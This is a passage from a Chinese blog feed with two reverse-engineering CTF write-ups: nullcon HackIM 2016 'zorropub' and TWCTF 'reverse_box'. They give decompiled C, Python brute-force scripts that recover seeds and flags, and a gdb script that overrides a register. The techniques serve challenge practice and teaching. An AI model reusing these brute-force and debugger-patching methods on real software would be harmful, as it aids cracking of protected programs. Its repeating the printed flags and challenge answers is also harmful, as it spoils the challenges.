    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/67.jpg" alt></p><a id="more"></a><p>[Adagio for Sunmmer Wind](<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=760037&auto=1&height=66"></iframe>)</p><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><ul><li>题目下载链接:</li></ul><p><a href="https://github.com/ctfs/write-ups-2016/blob/master/nullcon-hackim-2016/re/zorropub-100/zorro_bin" title="下载链接" target="_blank" rel="noopener">下载链接</a></p><h1 id="0x02-主要函数部分"><a href="#0x02-主要函数部分" class="headerlink" title="0x02 主要函数部分"></a>0x02 主要函数部分</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-FCh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="keyword">char</span> v11[<span class="number">16</span>]; <span class="comment">// [rsp+90h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">32</span>]; <span class="comment">// [rsp+A0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+C0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">40</span>]; <span class="comment">// [rsp+E0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  seed = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to Pub Zorro!!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Straight to the point. How many drinks you want?"</span>, a2);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You are too drunk!! Get Out!!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK. I need details of all the drinks. Give me %d drink ids:"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">16</span> || v6 &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid Drink Id."</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Get Out!!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    seed ^= v6;</span><br><span class="line">  &#125;</span><br><span class="line">  i = seed;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( i )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v9;</span><br><span class="line">    i &amp;= i - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Looks like its a dangerous combination of drinks right there."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Out, you will get yourself killed"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  srand(seed);</span><br><span class="line">  MD5_Init(&amp;v10);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = rand() % <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%d"</span>, v9);</span><br><span class="line">    v3 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">    MD5_Update(&amp;v10, &amp;s, v3);</span><br><span class="line">    v12[i] = v9 ^ LOBYTE(dword_6020C0[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  v12[i] = <span class="number">0</span>;</span><br><span class="line">  MD5_Final(v11, &amp;v10);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;s1[<span class="number">2</span> * i], <span class="string">"%02x"</span>, (<span class="keyword">unsigned</span> __int8)v11[i]);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">"5eba99aff105c9ff6a1a913e343fec67"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try different mix, This mix is too sloppy"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"\nYou choose right mix and here is your reward: The flag is nullcon&#123;%s&#125;\n"</span>, v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h1><ul><li>通过输入<code>饮料的瓶数</code> 和 <code>饮料的ID</code> 来影响<code>seed</code>的值,从而影响<code>MD5</code>的值以及<code>v12</code>数组的值。</li><li>当<code>MD5</code>值与题目所给的<code>MD5</code>相同时,则<code>v12</code>数组里面的值也就是正确的flag。</li></ul><h1 id="0x04-第一次爆破尝试"><a href="#0x04-第一次爆破尝试" class="headerlink" title="0x04 第一次爆破尝试"></a>0x04 第一次爆破尝试</h1><ul><li>爆破思路, 爆破饮料的瓶数和饮料的ID。</li><li>但是这样会比较麻烦, 当只要一瓶饮料的时候,爆破程序比较好写,当要两瓶及以上的饮料的时候,爆破程序写起来会复杂一些。</li><li>比较幸运的是,这道题目正确的输入就是需要输入一瓶饮料。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">libsystem = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> id <span class="keyword">in</span> range(<span class="number">17</span>, <span class="number">0xffff</span> + <span class="number">1</span>):</span><br><span class="line">    seed = <span class="number">0</span></span><br><span class="line">    seed ^= id</span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    i = seed</span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        v9 += <span class="number">1</span></span><br><span class="line">        i &amp;= (i - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">10</span>:</span><br><span class="line">        libsystem.srand(seed)</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            ran = libsystem.rand()</span><br><span class="line">            ran = ran % <span class="number">1000</span></span><br><span class="line">            h.update(<span class="string">"%d"</span> % ran)</span><br><span class="line">        <span class="keyword">if</span> h.hexdigest() == <span class="string">'5eba99aff105c9ff6a1a913e343fec67'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'num = 1 and id = %d'</span> % (id)</span><br><span class="line">            raw_input()</span><br></pre></td></tr></table></figure><ul><li>需要注意的是 <code>0 ^ x = x</code>,所以 <code>seed == id</code>。</li><li>这样跑出来(需要在Linux下跑)的结果是,饮料瓶数输入1,ID输入59306</li><li>运行程序,这么输入进去就能得到flag</li></ul><h1 id="0x05-第二次爆破尝试"><a href="#0x05-第二次爆破尝试" class="headerlink" title="0x05 第二次爆破尝试"></a>0x05 第二次爆破尝试</h1><ul><li><p>也可以直接爆破seed</p></li><li><p>脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">libsystem = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"><span class="comment"># Extracted by hand</span></span><br><span class="line">encryption_key = [</span><br><span class="line">    <span class="number">0x03C8</span>, <span class="number">0x0032</span>, <span class="number">0x02CE</span>, <span class="number">0x0302</span>, <span class="number">0x007F</span>,</span><br><span class="line">    <span class="number">0x01B8</span>, <span class="number">0x037E</span>, <span class="number">0x0188</span>, <span class="number">0x0349</span>, <span class="number">0x027F</span>,</span><br><span class="line">    <span class="number">0x005E</span>, <span class="number">0x0234</span>, <span class="number">0x0354</span>, <span class="number">0x01A3</span>, <span class="number">0x0096</span>,</span><br><span class="line">    <span class="number">0x0340</span>, <span class="number">0x0128</span>, <span class="number">0x02FC</span>, <span class="number">0x0300</span>, <span class="number">0x028E</span>,</span><br><span class="line">    <span class="number">0x0126</span>, <span class="number">0x001B</span>, <span class="number">0x032A</span>, <span class="number">0x02F5</span>, <span class="number">0x015F</span>,</span><br><span class="line">    <span class="number">0x0368</span>, <span class="number">0x01EB</span>, <span class="number">0x0079</span>, <span class="number">0x011D</span>, <span class="number">0x024E</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">need_md5 = <span class="string">'5eba99aff105c9ff6a1a913e343fec67'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> seed <span class="keyword">in</span> range(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">    i = seed</span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        v9+=<span class="number">1</span></span><br><span class="line">        i &amp;= (i<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">10</span>:</span><br><span class="line">        libsystem.srand(seed)</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">        flag = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            ran = libsystem.rand()%<span class="number">1000</span></span><br><span class="line">            h.update(<span class="string">"%d"</span>%ran)</span><br><span class="line">            flag += chr((ran^encryption_key[a])&amp;<span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">if</span> h.hexdigest() == <span class="string">'5eba99aff105c9ff6a1a913e343fec67'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'nullcon&#123;'</span>+ flag+<span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure><h1 id="0x06-第三次爆破尝试"><a href="#0x06-第三次爆破尝试" class="headerlink" title="0x06 第三次爆破尝试"></a>0x06 第三次爆破尝试</h1><ul><li><p>这次的方法是借鉴的网上的WP, 这次利用的是python的<code>subprocess模块</code>。</p></li><li><p>但是这个写这个脚本好像已经是确定了瓶数一定为1 ,这很玄学…</p></li><li><p>脚本如下:</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> seed <span class="keyword">in</span> range(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">    i = seed</span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        v9+=<span class="number">1</span></span><br><span class="line">        i &amp;= (i<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">10</span>:</span><br><span class="line">        L.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    p = subprocess.Popen(<span class="string">'./zorro_bin'</span>,stdin = subprocess.PIPE,stdout= subprocess.PIPE)</span><br><span class="line">    out = p.communicate(<span class="string">'1\n%s\n'</span> % i)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"nullcon&#123;"</span> <span class="keyword">in</span> out:</span><br><span class="line">        <span class="keyword">print</span> out</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="0x07-第四次爆破尝试"><a href="#0x07-第四次爆破尝试" class="headerlink" title="0x07 第四次爆破尝试"></a>0x07 第四次爆破尝试</h1><ul><li>这是第三种爆破方法的变形,利用的是<code>pwntools</code>,原理和三差不多,前提依然是要先知道饮料只要1瓶,脚本如下:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> seed <span class="keyword">in</span> range(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">    i = seed</span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        v9+=<span class="number">1</span></span><br><span class="line">        i &amp;= (i<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">10</span>:</span><br><span class="line">        L.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    p = subprocess.Popen(<span class="string">'./zorro_bin'</span>,stdin = subprocess.PIPE,stdout= subprocess.PIPE)</span><br><span class="line">    out = p.communicate(<span class="string">'1\n%s\n'</span> % i)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"nullcon&#123;"</span> <span class="keyword">in</span> out:</span><br><span class="line">        <span class="keyword">print</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    p = process(<span class="string">'./zorro_bin'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Straight to the point. How many drinks you want?'</span>)</span><br><span class="line">    p.sendline(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'OK. I need details of all the drinks. Give me 1 drink ids:'</span>)</span><br><span class="line">    p.sendline(i)</span><br><span class="line">    str = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'nullcon&#123;'</span> <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">print</span> str</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><ul><li>这道题解出来还是很玄学的,为什么瓶数一定是1,确实很令人费解。</li><li>通过这道题目,也加强了自己写爆破脚本的能力。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/psbVIYX0XYE.jpg" alt></p>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>从一道题目学习gdb脚本</title>
    <url>/2019/09/23/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0gdb%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/23981.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li>题目是<code>TWCTF-reverse_box</code>,题目下载链接如下:</li></ul><p><a href="https://adworld.xctf.org.cn/media/task/attachments/cfacbcea531c45cba0a90aebe05b2789.7z" target="_blank" rel="noopener">下载链接</a></p><h1 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h1><ul><li>主要由两个函数来解题。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+18h] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-108h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+11Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"usage: %s flag\n"</span>, *a2);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_804858D(&amp;v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a2[<span class="number">1</span>]); ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x"</span>, *((<span class="keyword">unsigned</span> __int8 *)&amp;v4 + a2[<span class="number">1</span>][i]));</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_804858D</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// ST1B_1</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v7; <span class="comment">// [esp+1Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v10 = (<span class="keyword">unsigned</span> __int8)rand();</span><br><span class="line">  <span class="keyword">while</span> ( !v10 );</span><br><span class="line">  *a1 = v10;</span><br><span class="line">  v7 = <span class="number">1</span>;</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v7 ^ <span class="number">2</span> * v7;</span><br><span class="line">    <span class="keyword">if</span> ( (v7 &amp; <span class="number">0x80</span>u) == <span class="number">0</span> )</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">27</span>;</span><br><span class="line">    v7 = v2 ^ v3;</span><br><span class="line">    v4 = <span class="number">4</span> * (<span class="number">2</span> * v8 ^ v8) ^ <span class="number">2</span> * v8 ^ v8;</span><br><span class="line">    v9 = <span class="number">16</span> * v4 ^ v4;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">9</span>;</span><br><span class="line">    v8 = v9 ^ v5;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">4</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">5</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">6</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">7</span>) ^ (<span class="keyword">unsigned</span> __int8)(v8 ^ *a1);</span><br><span class="line">    a1[v7] = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 != <span class="number">1</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>题目提示如果传入正确的Flag则会输出<code>95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4</code></p></li><li><p>但是分析题目, 题目会取当前时间作为随机数种子,然后取一堆随机数执行一堆操作。</p></li><li><p>由于当前时间在不断变化,所以这个随机数种子是不固定的,所取的随机数也不固定,这就对解题产生了很大的困难。</p></li><li><p>但是查看这个算法函数<code>sub_804858D</code>的汇编代码,发现了惊喜!</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190924000608.png" alt></p><ul><li>所取的随机数最后会跟<code>0xFF</code>进行按位与运算,这就会使此时eax的值只能取0-255其中一个,也就是说我们的<code>v10</code>只能取0-255中的一个,这就为我们执行爆破提供了可能。</li></ul><h1 id="0x02-写脚本前的分析"><a href="#0x02-写脚本前的分析" class="headerlink" title="0x02 写脚本前的分析"></a>0x02 写脚本前的分析</h1><ul><li><p>既然我们想进行爆破,但因为由于时间的变化随机数种子一直变会,<code>v10</code>也会一直变,所以我们直接控制<code>v10</code>。</p></li><li><p>那么该如何控制<code>v10</code>呢？我们可以通过gdb脚本来在每次给<code>v10</code>赋值的时候进行<code>暗箱操作</code>。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190924002044.png" alt></p><ul><li><p>而这个赋值的时候通过IDA能够找到,就是图中<code>0x080485B1</code>的位置,因此我们需要在这个位置下个断点。</p></li><li><p>该如何暗箱操作？ 既然赋值是通过eax寄存器来实现的,那么我们可以通过<code>set $eax 计数器</code>的形式来改变eax的值,计数器的范围就是0~255。</p></li><li><p>而且根据要求,还需要满足首先输出<code>0x95</code>(因为题中用的<code>printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v4 + a2[1][i]));</code>,所以输出出来只有<code>95</code>)。</p></li><li><p>我们来看<code>printf</code>这附近的汇编代码。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190924002444.png" alt></p><ul><li>依然是用eax寄存器来传值,又因为<code>printf</code>是在一个<code>for循环</code>里面,如果第一次输出的是<code>95</code>,则爆破成功,否则就让<code>计数器</code>+1 再来一遍~</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190924003142.png" alt></p><ul><li>爆破成功以后我们就能得到这个<code>a2[1][?]</code>里面的内容了,从而就能逆出flag。</li></ul><h1 id="0x03-脚本的实现"><a href="#0x03-脚本的实现" class="headerlink" title="0x03 脚本的实现"></a>0x03 脚本的实现</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">set $i=0</span><br><span class="line">set $total=256</span><br><span class="line"><span class="meta">while($</span><span class="bash">i&lt;<span class="variable">$total</span>)<span class="comment">#循环条件</span></span></span><br><span class="line">  b *0x080485B1#下断点</span><br><span class="line">  b *0x08048704#下断点</span><br><span class="line">  run T #运行</span><br><span class="line">  set $eax=$i #给eax赋值</span><br><span class="line">  set $i=$i+1 #计数器自增</span><br><span class="line">  continue #因为下断点了, 所以需要有个continue</span><br><span class="line">  if ($eax==0x95)</span><br><span class="line">    print $i, $i #可有可无的一句</span><br><span class="line">    x/256xb $esp+0x1c #查看堆栈内容</span><br><span class="line">    set $i=256 #直接让计数器为256 从而退出while循环</span><br><span class="line">    end #结束if语句内容的写入</span><br><span class="line">  stop #暂停,因为如果爆破成功要查看堆栈内容</span><br><span class="line">  end #结束while语句内容的写入</span><br><span class="line">end #结束脚本</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190924003836.png" alt></p><ul><li>通过<code>define 脚本名称</code>来新建一个脚本。</li><li>通过<code>脚本名称</code>来调用一个脚本。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190924003939.png" alt></p><ul><li>运行脚本得到如下结果</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190924010009.png" alt></p><h1 id="得出flag"><a href="#得出flag" class="headerlink" title="得出flag"></a>得出flag</h1><ul><li>通过结果再结合题意逆出flag,脚本如下(Python)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">s = <span class="string">'95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a'</span></span><br><span class="line"></span><br><span class="line">List = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> s.decode(<span class="string">'hex'</span>) ]</span><br><span class="line"></span><br><span class="line">str = <span class="string">'''</span></span><br><span class="line"><span class="string">0xd6	0xc9	0xc2	0xce	0x47	0xde	0xda	0x70</span></span><br><span class="line"><span class="string">0x85	0xb4	0xd2	0x9e	0x4b	0x62	0x1e	0xc3</span></span><br><span class="line"><span class="string">0x7f	0x37	0x7c	0xc8	0x4f	0xec	0xf2	0x45</span></span><br><span class="line"><span class="string">0x18	0x61	0x17	0x1a	0x29	0x11	0xc7	0x75</span></span><br><span class="line"><span class="string">0x02	0x48	0x26	0x93	0x83	0x8a	0x42	0x79</span></span><br><span class="line"><span class="string">0x81	0x10	0x50	0x44	0xc4	0x6d	0x84	0xa0</span></span><br><span class="line"><span class="string">0xb1	0x72	0x96	0x76	0xad	0x23	0xb0	0x2f</span></span><br><span class="line"><span class="string">0xb2	0xa7	0x35	0x57	0x5e	0x92	0x07	0xc0</span></span><br><span class="line"><span class="string">0xbc	0x36	0x99	0xaf	0xae	0xdb	0xef	0x15</span></span><br><span class="line"><span class="string">0xe7	0x8e	0x63	0x06	0x9c	0x56	0x9a	0x31</span></span><br><span class="line"><span class="string">0xe6	0x64	0xb5	0x58	0x95	0x49	0x04	0xee</span></span><br><span class="line"><span class="string">0xdf	0x7e	0x0b	0x8c	0xff	0xf9	0xed	0x7a</span></span><br><span class="line"><span class="string">0x65	0x5a	0x1f	0x4e	0xf6	0xf8	0x86	0x30</span></span><br><span class="line"><span class="string">0xf0	0x4c	0xb7	0xca	0xe5	0x89	0x2a	0x1d</span></span><br><span class="line"><span class="string">0xe4	0x16	0xf5	0x3a	0x27	0x28	0x8d	0x40</span></span><br><span class="line"><span class="string">0x09	0x03	0x6f	0x94	0xa5	0x4a	0x46	0x67</span></span><br><span class="line"><span class="string">0x78	0xb9	0xa6	0x59	0xea	0x22	0xf1	0xa2</span></span><br><span class="line"><span class="string">0x71	0x12	0xcb	0x88	0xd1	0xe8	0xac	0xc6</span></span><br><span class="line"><span class="string">0xd5	0x34	0xfa	0x69	0x97	0x9f	0x25	0x3d</span></span><br><span class="line"><span class="string">0xf3	0x5b	0x0d	0xa1	0x6b	0xeb	0xbe	0x6e</span></span><br><span class="line"><span class="string">0x55	0x87	0x8f	0xbf	0xfc	0xb3	0x91	0xe9</span></span><br><span class="line"><span class="string">0x77	0x66	0x19	0xd7	0x24	0x20	0x51	0xcc</span></span><br><span class="line"><span class="string">0x52	0x7d	0x82	0xd8	0x38	0x60	0xfb	0x1c</span></span><br><span class="line"><span class="string">0xd9	0xe3	0x41	0x5f	0xd0	0xcf	0x1b	0xbd</span></span><br><span class="line"><span class="string">0x0f	0xcd	0x90	0x9b	0xa9	0x13	0x01	0x73</span></span><br><span class="line"><span class="string">0x5d	0x68	0xc1	0xaa	0xfe	0x08	0x3e	0x3f</span></span><br><span class="line"><span class="string">0xc5	0x8b	0x00	0xd3	0xfd	0xb6	0x43	0xbb</span></span><br><span class="line"><span class="string">0xd4	0x80	0xe2	0x0c	0x33	0x74	0xa8	0x2b</span></span><br><span class="line"><span class="string">0x54	0x4d	0x2d	